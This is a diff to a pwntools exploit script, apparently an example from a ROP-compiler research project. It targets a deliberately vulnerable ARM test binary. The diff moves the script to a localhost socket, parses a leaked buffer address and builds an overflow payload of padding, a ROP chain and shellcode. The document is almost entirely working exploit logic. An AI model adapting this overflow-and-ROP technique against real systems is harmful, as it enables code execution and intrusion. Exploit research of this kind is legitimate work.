@@ -4,11 +4,14 @@ from pwn import *
 from rop_compiler import ropme
 
 filename = './example/arm_bof'
-p = process(['qemu-arm',filename,'3000'])
+#options = ['qemu-arm']
+options = ['ssh', 'armel']
+options.extend([filename, '3000'])
+#p = process(options)
 #gdb.attach(p, "set disassembly-flavor intel\nbreak *0x40063f\nbreak *0x400641\nbreak *0x400643")
+p = remote('localhost', 8888)
 
-line = p.readline()
-buffer_address = int(line.split(":")[1],16)
+buffer_address = struct.unpack("<I", p.read(4))[0]
 
 # TODO replay arm shellcode
 shellcode = (
@@ -22,6 +25,7 @@ rop = ropme.rop_to_shellcode([(filename, 0)], target_address, archinfo.ArchARM, 
 
 payload = 'A'*512 + 'B'*4 + rop
 payload += ((1024 - len(payload)) * 'B') + shellcode
+payload += "JEFF" # To end our input
 
 with open("/tmp/rop", "w") as f: f.write(rop)
 with open("/tmp/payload", "w") as f: f.write(payload)
